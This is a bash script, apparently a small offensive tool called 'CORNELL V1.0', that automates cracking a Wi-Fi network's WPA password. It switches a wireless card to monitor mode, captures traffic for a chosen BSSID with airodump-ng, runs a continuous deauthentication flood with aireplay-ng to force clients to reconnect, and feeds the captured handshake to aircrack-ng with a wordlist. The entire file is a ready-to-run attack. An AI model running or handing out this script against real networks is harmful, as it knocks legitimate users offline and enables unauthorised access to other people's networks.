#!/bin/bash
##functions

log() {  echo -e "\e[49m$1\e[0m"; }
log_danger() {  echo -e "\e[31m$1\e[0m"; }
log_info() {  echo -e "\e[34m$1\e[0m"; }
log_warn(){ echo -e "\e[93m$1\e[0m"; }
log_ok(){ echo -e "\e[32m$1\e[0m"; }
log_header(){ echo -e "\n\e[92m\e[1mCORNELL V1.0 -  \e[0mhttp://mauricio.pe\n-----\n"; }



INTERFACE_MONITOR=$1
BSSID=$2
CHANNEL=$3

W_FOLDER=/tmp
W_FILE='wifi-dump'
WORDLIST=$5

echo 'Cleaning tmps...'
rm -rf ${W_FOLDER}/${W_FILE}*

function exit_process(){ echo -e "Crash..."; fn_exit; }
function ctrl_c() {  echo -e "Exit by user"; fn_exit; }
function error() {   echo -e "\n"; fn_exit; }
trap exit_process SIGINT
trap ctrl_c INT
trap 'error $LINENO' ERR

function fn_exit(){
	killing_all
	log_danger "Exiting applcation...\n";
	exit;
}

function killing_all(){
	applications=( aircrack-ng airodump-ng aireplay-ng airbase-ng )

	log_info "\nKilling applications..."
	for i in ${applications[@]}; do
		if ps -A | grep -q ${i}; then
			killall -s SIGKILL ${i}
			log_danger "[*] ${i} was stopped"
		else log_warn  "[*] ${i} is not running"
		fi
	done


}


##Start application

##cheking requirement
to_exit=0
requirements=( aircrack-ng )
log "Checking requirements...\n"
for i in ${requirements[@]}; do
	if ! hash ${i} 2>/dev/null; then
		log_danger "[ ] ${i} is not installed "
		to_exit=1
	else log_ok  "[*] ${i} is installed"
	fi
done
echo -e "\n"

if [ "$to_exit" = "1" ]; then
	log "Install all the requirements...\n"
	exit 1
fi
##end cheking requirement

#print header application
log_header

killing_all
echo -e "\n"


log_ok "Setting Mode Monitor..."
ifconfig ${INTERFACE_MONITOR} down && iwconfig ${INTERFACE_MONITOR} mode monitor && ifconfig ${INTERFACE_MONITOR} up &&



log_ok "Dumping network..."
xterm -bg blue -geometry 93x28+0+0 -T "Dumping..." -e bash -c "airodump-ng -c ${CHANNEL} --bssid ${BSSID} -w ${W_FOLDER}/${W_FILE} $INTERFACE_MONITOR"  &

sleep 4

xterm -geometry 93x28+0+450 -e bash -c "aireplay-ng -0 0 -a ${BSSID}  ${INTERFACE_MONITOR}" &


sleep $4
log_ok "Cracking password..."
xterm -hold -geometry 93x28+600+0 -T "Cracking password" -e bash -c "aircrack-ng -a2 -b ${BSSID} -w '${WORDLIST}' '${W_FOLDER}/${W_FILE}-01.cap'" &

cat
